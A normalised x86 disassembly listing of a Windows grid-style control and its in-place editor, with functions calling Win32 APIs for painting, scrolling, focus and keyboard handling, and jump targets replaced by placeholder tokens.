push esi
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
call sub_471518
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_46dbf0
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
call sub_47153c
pop ecx
cmp esi eax
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ ebp - 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_46dbf0
cmp eax [ ebp - 0x4 ]
je r-xdata
cmp ebx [ ebp - 0x4 ]
jne r-xdata
mov al 0x1
sub_4715d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
call sub_471518
pop ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_47153c
pop ecx
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_46dbf0
cmp ebx eax
je r-xdata
sub_47161c
push ebp
mov ebp esp
add esp 0xfffffff4
push esi
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
movzx eax [ eax ]
cmp eax 0x26
jg r-xdata
cmp eax 0x2d
jg r-xdata
je r-xdata
sub eax 0x2e
je r-xdata
je r-xdata
push ebp
call sub_471470
pop ecx
jmp r-xdata
cmp eax 0x23
jg r-xdata
push ebp
call sub_471508
pop ecx
test al al
je r-xdata
sub eax 0x43
je r-xdata
mov al [ r-xdata ]
cmp al [ ebp - 0x9 ]
jne r-xdata
sub eax 0x27
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
je r-xdata
sub eax 0x24
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
mov si 0xffb0
call sub_40349c
test al al
jne r-xdata
push ebp
call sub_471470
pop ecx
jmp r-xdata
push ebp
call sub_4714a4
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x71
jne r-xdata
jmp r-xdata
mov al [ r-xdata ]
cmp al [ ebp - 0x9 ]
jne r-xdata
push ebp
call sub_471470
pop ecx
jmp r-xdata
push ebp
call sub_4714ec
pop ecx
test al al
je r-xdata
dec eax
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
push ebp
call sub_4714a4
pop ecx
mov edx [ ebp - 0x8 ]
mov cl [ ebp - 0x9 ]
mov eax [ ebp - 0x4 ]
call sub_46d96c
push ebp
call sub_4714ec
pop ecx
test al al
je r-xdata
dec eax
je r-xdata
push ebp
call sub_4714ec
pop ecx
test al al
je r-xdata
sub eax 0x9
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
call sub_4719c8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
mov si 0xffb0
call sub_40349c
test al al
jne r-xdata
push ebp
call sub_471508
pop ecx
test al al
jne r-xdata
jmp r-xdata
push ebp
call sub_471508
pop ecx
test al al
jne r-xdata
push ebp
call sub_4714ec
pop ecx
test al al
je r-xdata
jmp r-xdata
push ebp
call sub_471508
pop ecx
test al al
jne r-xdata
test [ ebp - 0x9 ] 0x2
jne r-xdata
sub eax 0x12
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
jmp r-xdata
push ebp
call sub_471470
pop ecx
jmp r-xdata
push ebp
call sub_471578
pop ecx
test al al
je r-xdata
push ebp
call sub_471470
pop ecx
jmp r-xdata
push ebp
call sub_4715d0
pop ecx
test al al
je r-xdata
push ebp
call sub_471508
pop ecx
test al al
jne r-xdata
push ebp
call sub_471470
pop ecx
jmp r-xdata
push ebp
call sub_471578
pop ecx
test al al
je r-xdata
push ebp
call sub_471470
pop ecx
jmp r-xdata
add eax 0xfffffffa
sub eax 0x2
jb r-xdata
push ebp
call sub_471470
pop ecx
jmp r-xdata
push ebp
call sub_4715d0
pop ecx
test al al
je r-xdata
jmp r-xdata
sub_471849
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
mov edx ebx
mov eax [ edi + 0x240 ]
mov si 0xffba
call sub_40349c
mov al [ ebx ]
add al 0xe0
sub al 0xe0
jae r-xdata
xor eax eax
mov al [ ebx ]
cmp eax 0x16
jg r-xdata
mov dl [ ebx ]
mov eax [ edi + 0x240 ]
mov si 0xffb2
call sub_40349c
test al al
jne r-xdata
sub eax 0x18
je r-xdata
je r-xdata
mov [ ebx ] 0x0
push 0x0
call MessageBeep
mov eax [ edi + 0x240 ]
mov si 0xffb0
call sub_40349c
test al al
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x8
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
mov [ ebx ] 0x0
mov [ ebx ] 0x0
jmp r-xdata
add eax 0xfffffffb
sub eax 0xe0
jb r-xdata
dec eax
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
call sub_46da9c
jmp r-xdata
sub eax 0x4
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax edi
call sub_4445f8
push eax
call SendMessageA
cmp [ esp ] 0x0
jne r-xdata
jmp r-xdata
mov eax edi
call sub_432054
mov eax edi
call sub_46dbf0
cmp eax [ esp + 0x4 ]
jne r-xdata
mov eax edi
call sub_4719c8
jmp r-xdata
mov [ ebx ] 0x0
jmp r-xdata
sub_471950
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ esi ]
sub eax 0x7
je r-xdata
mov eax ebx
call sub_455244
test eax eax
je r-xdata
sub eax 0x1fa
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
mov eax ebx
call sub_455244
mov edx [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
call GetMessageTime
mov edi eax
sub edi [ ebx + 0x244 ]
call GetDoubleClickTime
cmp edi eax
jae r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x244 ] eax
mov [ esi ] 0x203
mov edx esi
mov eax ebx
call sub_44200c
sub_4719e8
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
mov eax ebx
call sub_4445f8
push eax
call ValidateRect
push 0xffffffff
push 0x0
mov eax ebx
call sub_4445f8
push eax
call InvalidateRect
push esp
mov eax ebx
call sub_4445f8
push eax
call GetClientRect
push 0x2
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x240 ]
call sub_4445f8
push eax
mov eax ebx
call sub_4445f8
push eax
call MapWindowPoints
push esp
mov eax [ ebx + 0x240 ]
call sub_4445f8
push eax
call ValidateRect
push 0x0
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x240 ]
call sub_4445f8
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_471a6c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4448fc
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4445f8
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_4719e8
push 0x8c
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4445f8
push eax
call SetWindowPos
mov eax ebx
mov si 0xffb5
call sub_40349c
test al al
je r-xdata
mov eax [ ebx + 0x240 ]
call sub_4445f8
push eax
call SetFocus
sub_471ad4
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
push esi
call IsRectEmpty
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x94 ]
test bl bl
jne r-xdata
mov eax edi
call sub_471a6c
jmp r-xdata
mov al 0x1
mov eax edi
call sub_4445f8
push eax
call IsWindowVisible
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x240 ]
mov si 0xffb5
call sub_40349c
test al al
je r-xdata
mov eax edi
call sub_4719e8
xor eax eax
jmp r-xdata
mov eax edi
call sub_4445f8
push eax
call SetFocus
mov ebx eax
mov eax edi
call sub_4719e8
push 0x48
mov eax [ esi + 0xc ]
sub eax [ esi + 0x4 ]
push eax
mov eax [ esi + 0x8 ]
mov ebp [ esi ]
sub eax ebp
push eax
mov eax [ esi + 0x4 ]
push eax
push ebp
push 0x0
mov eax edi
call sub_4445f8
push eax
call SetWindowPos
mov eax edi
mov edx [ eax ]
call [ edx + 0xfc ]
test bl bl
je r-xdata
sub_471b84
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
sub ecx 0x2
mov edx 0x2
mov eax 0x2
call sub_4129b0
mov eax esp
push eax
push 0x0
push 0xb4
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
push 0x0
push 0x0
push 0xb7
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
add esp 0x10
pop ebx
retn
sub_471bec
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_471c98
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_46dcd4
lea eax [ ebp - 0x4 ]
push eax
mov edi [ ebx + 0x240 ]
mov ecx [ edi + 0x22c ]
mov edx [ edi + 0x228 ]
mov eax edi
mov si 0xffac
call sub_40349c
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46dfc8
lea eax [ ebp - 0x8 ]
push eax
mov edi [ ebx + 0x240 ]
mov ecx [ edi + 0x22c ]
mov edx [ edi + 0x228 ]
mov eax edi
mov si 0xffaf
call sub_40349c
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_46dcd4
mov eax [ ebx + 0x240 ]
mov si 0xffad
call sub_40349c
mov edx eax
mov eax ebx
call sub_46e09c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471c9f
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404098
retn
sub_471ca8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4462c0
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
mov [ ebx + 0x219 ] 0x1
mov [ ebx + 0x21c ] 0x5
mov [ ebx + 0x24c ] 0x5
mov [ ebx + 0x238 ] 0x1
mov [ ebx + 0x23c ] 0x1
mov [ ebx + 0x244 ] 0x1
mov ax [ r-xdata ]
mov [ ebx + 0x248 ] ax
mov ax [ r-xdata ]
mov [ ebx + 0x290 ] ax
mov [ ebx + 0x240 ] 0xff00000f
mov [ ebx + 0x254 ] 0x3
mov [ ebx + 0x218 ] 0x1
mov [ ebx + 0x230 ] 0x40
mov [ ebx + 0x234 ] 0x18
mov [ ebx + 0x28c ] 0x1
mov [ ebx + 0x28f ] 0x1
mov [ ebx + 0x28d ] 0x0
mov edx 0xff000005
mov eax ebx
call sub_43df98
xor edx edx
mov eax ebx
call sub_43dfbc
mov dl 0x1
mov eax ebx
call sub_44482c
mov eax [ ebx + 0x21c ]
imul [ ebx + 0x230 ]
push eax
mov eax [ ebx + 0x24c ]
imul [ ebx + 0x234 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax ebx
call sub_474228
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_471df8
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax [ esi + 0x27c ]
call sub_4032a0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44631c
mov eax [ esi + 0x220 ]
call sub_4026ec
mov eax [ esi + 0x250 ]
call sub_4026ec
mov eax [ esi + 0x224 ]
call sub_4026ec
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_471e4c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_471f58
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0xc ]
add eax [ edx - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax - 0x4 ] 0x0
jge r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405ba4
mov eax [ ebp - 0x10 ]
call sub_470e64
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
imul esi
mov [ ebp - 0x8 ] eax
cmp [ ebx ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov edx [ ebp + 0xc ]
cmp eax [ edx - 0x8 ]
jl r-xdata
push esi
mov eax [ ebp + 0xc ]
mov ecx [ eax - 0x4 ]
mov eax [ ebp + 0xc ]
mov edx [ eax - 0x8 ]
mov eax ebx
call sub_471170
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp + 0xc ]
sub eax [ ecx - 0x4 ]
dec eax
sub eax edx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471f5f
lea eax [ ebp - 0x10 ]
call sub_404074
retn
mov eax [ ebp + 0xc ]
cmp [ eax - 0x4 ] 0x0
jge r-xdata
cmp [ ebx ] 0x0
je r-xdata
inc eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx [ ebp + 0x8 ]
add [ edx ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0xc ]
sub eax [ edx - 0x4 ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov ecx [ ebx ]
mov ecx [ ecx + edx * 4 ]
add [ ebp - 0x8 ] ecx
inc edx
dec eax
jne r-xdata
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
sub_471f6c
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x228 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x22c ]
mov [ ebp - 0xc ] eax
mov eax [ ebx + 0x21c ]
mov [ ebp - 0x18 ] eax
mov edx [ ebx + 0x24c ]
mov [ ebp - 0x14 ] edx
mov ecx [ ebx + 0x238 ]
mov [ ebp - 0x2c ] ecx
dec eax
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x23c ]
mov [ ebp - 0x28 ] eax
dec edx
mov [ ebp - 0x20 ] edx
xor edi edi
xor eax eax
mov [ ebp - 0x1c ] eax
mov esi [ ebp - 0x4 ]
test esi esi
jge r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
neg esi
push ebp
lea eax [ ebp - 0x10 ]
push eax
lea edx [ ebx + 0x220 ]
lea eax [ ebx + 0x21c ]
mov ecx [ ebx + 0x230 ]
call sub_471e4c
pop ecx
mov edi eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x2c ] eax
add esi [ ebp - 0x8 ]
mov eax [ ebx + 0x258 ]
cmp esi eax
jg r-xdata
push ebp
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebx + 0x250 ]
lea eax [ ebx + 0x24c ]
mov ecx [ ebx + 0x234 ]
call sub_471e4c
pop ecx
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
add esi [ ebp - 0x8 ]
mov eax [ ebx + 0x25c ]
cmp esi eax
jg r-xdata
push 0x1
lea ecx [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
mov eax ebx
call sub_474138
lea eax [ ebp - 0x3c ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
dec eax
mov [ ebp - 0x24 ] eax
dec eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x18 ]
mov eax ebx
mov si 0xffa8
call sub_40349c
mov eax [ ebp - 0x10 ]
cmp eax [ ebx + 0x228 ]
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x1c ]
push eax
push edi
mov eax ebx
call sub_4445f8
push eax
call ScrollWindow
mov eax ebx
call sub_4445f8
push eax
call UpdateWindow
push 0x1
push 0x1
mov ecx [ ebp - 0xc ]
mov edx eax
mov eax ebx
call sub_47497c
mov edx [ ebp - 0xc ]
cmp edx [ ebx + 0x22c ]
je r-xdata
sub_4720d0
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov esi eax
mov [ ebp - 0x10 ] edx
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] ecx
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp + 0x8 ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_474138
pop esi
mov esp ebp
pop ebp
retn 0xc
sub_472120
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4720d0
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_472154
push ebx
mov ebx eax
mov ax [ ebx + 0x248 ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
xor eax eax
pop ebx
retn
cmp [ ebx + 0x28d ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_4448fc
test al al
je r-xdata
test [ ebx + 0x249 ] 0x20
jne r-xdata
mov al 0x1
pop ebx
retn
mov eax ebx
call sub_4721b0
test al al
jne r-xdata
sub_4721b0
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_455244
test eax eax
je r-xdata
call GetFocus
mov edi eax
jmp r-xdata
cmp esi [ eax + 0x220 ]
jne r-xdata
push edi
call IsWindow
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
jmp r-xdata
test bl bl
je r-xdata
cmp edi [ esi + 0x180 ]
jne r-xdata
push edi
call GetParent
mov edi eax
mov bl 0x1
jmp r-xdata
sub_472250
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax edi
call sub_472240
mov esi [ edi + 0x27c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push 0x0
xor eax eax
mov al bl
push eax
push 0x102
mov eax esi
call sub_4445f8
push eax
call PostMessageA
sub_4722a4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax ebp
call sub_41806c
mov ebx [ edi + 0x21c ]
dec ebx
test ebx ebx
jl r-xdata
mov eax ebp
call sub_418074
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax ebp
call sub_417fbc
mov ecx eax
mov edx esi
mov eax edi
call sub_4764a4
inc esi
dec ebx
jne r-xdata
sub_4722e4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax ebp
call sub_41806c
mov ebx [ edi + 0x24c ]
dec ebx
test ebx ebx
jl r-xdata
mov eax ebp
call sub_418074
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax ebp
call sub_417fbc
mov ecx eax
mov edx esi
mov eax edi
call sub_476814
inc esi
dec ebx
jne r-xdata
sub_472324
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax ebp
call sub_4198b8
mov ebx [ edi + 0x21c ]
dec ebx
test ebx ebx
jl r-xdata
mov eax ebp
call sub_4198c0
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_476384
mov edx eax
mov eax ebp
call sub_419844
inc esi
dec ebx
jne r-xdata
sub_472364
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax ebp
call sub_4198b8
mov ebx [ edi + 0x24c ]
dec ebx
test ebx ebx
jl r-xdata
mov eax ebp
call sub_4198c0
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4763a4
mov edx eax
mov eax ebp
call sub_419844
inc esi
dec ebx
jne r-xdata
sub_4723a4
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x220 ] 0x0
setne al
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x220 ]
mov eax [ ebp + 0x8 ]
mov eax [ ebx + 0x220 ]
call sub_4712d4
xor al 0x1
pop ebx
pop ebp
retn
sub_4723e8
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x250 ] 0x0
setne al
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x250 ]
mov eax [ ebp + 0x8 ]
mov eax [ ebx + 0x250 ]
call sub_4712d4
xor al 0x1
pop ebx
pop ebp
retn
sub_47242c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_441938
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x28f ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
push eax
push sub_4722a4
mov eax [ ebp - 0x8 ]
push eax
push sub_472324
push ebp
call sub_4723a4
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
mov eax [ ebp - 0x8 ]
push eax
push sub_4722e4
mov eax [ ebp - 0x8 ]
push eax
push sub_472364
push ebp
call sub_4723e8
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4724d0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x220 ] 0x0
je r-xdata
push edi
lea edx [ ebx + 0x228 ]
mov ecx esi
mov eax ebx
call sub_4748c0
push edi
lea edx [ ebx + 0x210 ]
mov ecx esi
mov eax ebx
call sub_4748c0
push edi
lea edx [ ebx + 0x280 ]
mov ecx esi
mov eax ebx
call sub_4748c0
xor eax eax
mov [ esp + 0x4 ] eax
mov eax ebx
call sub_476414
mov [ esp + 0xc ] eax
cmp edi esi
jle r-xdata
lea ecx [ edi + 0x1 ]
lea ebp [ esi + 0x1 ]
mov edx ebp
lea eax [ ebx + 0x220 ]
call sub_47127c
lea ecx [ edi + 0x1 ]
mov edx ebp
lea eax [ ebx + 0x224 ]
call sub_47127c
mov [ esp ] edi
mov [ esp + 0x8 ] esi
mov [ esp ] esi
mov [ esp + 0x8 ] edi
jmp r-xdata
mov eax ebx
call sub_4769b0
mov eax ebx
mov si 0xffa5
call sub_40349c
mov edx esp
mov eax ebx
call sub_4742b4
mov ecx edi
mov edx esi
mov eax ebx
mov si 0xffaa
call sub_40349c
cmp [ ebx + 0x220 ] 0x0
je r-xdata
sub_4725a8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
lea edx [ ebx + 0x22c ]
mov ecx esi
mov eax ebx
call sub_4748c0
push edi
lea edx [ ebx + 0x214 ]
mov ecx esi
mov eax ebx
call sub_4748c0
push edi
lea edx [ ebx + 0x284 ]
mov ecx esi
mov eax ebx
call sub_4748c0
mov ecx edi
mov edx esi
mov eax ebx
mov si 0xffa9
call sub_40349c
cmp [ ebx + 0x250 ] 0x0
je r-xdata
lea ecx [ edi + 0x1 ]
lea edx [ esi + 0x1 ]
lea eax [ ebx + 0x250 ]
call sub_47127c
mov eax ebx
call sub_4769b0
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffa4
call sub_40349c
sub_472638
push ebx
push esi
push edi
add esp 0xffffff90
mov edi ecx
mov esi edx
mov ebx eax
mov al [ ebx + 0x28e ]
mov [ esp ] al
cmp [ esp ] 0x0
jne r-xdata
cmp [ esp ] 0x0
setne al
add esp 0x70
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x10 ]
mov eax ebx
call sub_473310
push esp
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x18 ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xcc ]
sub_472690
push ebx
add esp 0xfffffff0
mov ebx eax
cmp [ ebx + 0x28d ] 0x0
je r-xdata
add esp 0x10
pop ebx
retn
cmp [ ebx + 0x27c ] 0x0
je r-xdata
push esp
mov ecx [ ebx + 0x22c ]
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_472120
mov edx esp
mov eax [ ebx + 0x27c ]
call sub_471bdc
sub_4726dc
pop ecx
mov edx esp
add eax 0x3
and eax 0xfffffffc
cmp eax 0xffc
jle r-xdata
sub esp eax
mov eax esp
push edx
mov edx esp
sub edx 0x4
push edx
push ecx
retn
sub esp 0xffc
push eax
sub eax 0x1000
jns r-xdata
add eax 0x1000
sub_472724
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x208 ]
cmp [ ebx ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x244 ]
mov eax [ esi + 0x10 ]
call sub_41da18
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ eax + 0x8 ]
mov eax [ esi + 0x10 ]
call sub_41d8ec
mov eax [ ebp + 0xc ]
mov edx [ eax + 0xc ]
mov eax [ esi + 0x10 ]
call sub_41d8ec
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x10 ] eax
mov edx edi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
mov edx [ ebp + 0xc ]
mov edx [ edx + 0x14 ]
mov ecx [ ebp - 0x4 ]
mov edx [ edx + ecx * 4 ]
mov ecx [ ebx ]
shr ecx 0x1
add edx ecx
add eax edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov eax [ eax - 0x4 ]
mov si 0xffc8
call sub_40349c
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x2c ] eax
mov eax [ esi + 0x10 ]
call sub_41d8e4
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
push 0x0
lea eax [ ebp - 0x2c ]
push eax
mov eax [ esi + 0x10 ]
call sub_41da10
push eax
push 0x12200
call ExtCreatePen
mov edx eax
mov eax [ esi + 0x10 ]
call sub_41d9ac
mov eax [ esi + 0x10 ]
call sub_41da10
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
xor eax 0x1
mov edx [ ebp + 0xc ]
mov edx [ edx + 0x14 ]
mov edx [ edx + eax * 4 ]
mov [ ebp - 0x18 ] edx
add eax 0x2
mov edx [ ebp + 0xc ]
mov edx [ edx + 0x14 ]
mov eax [ edx + eax * 4 ]
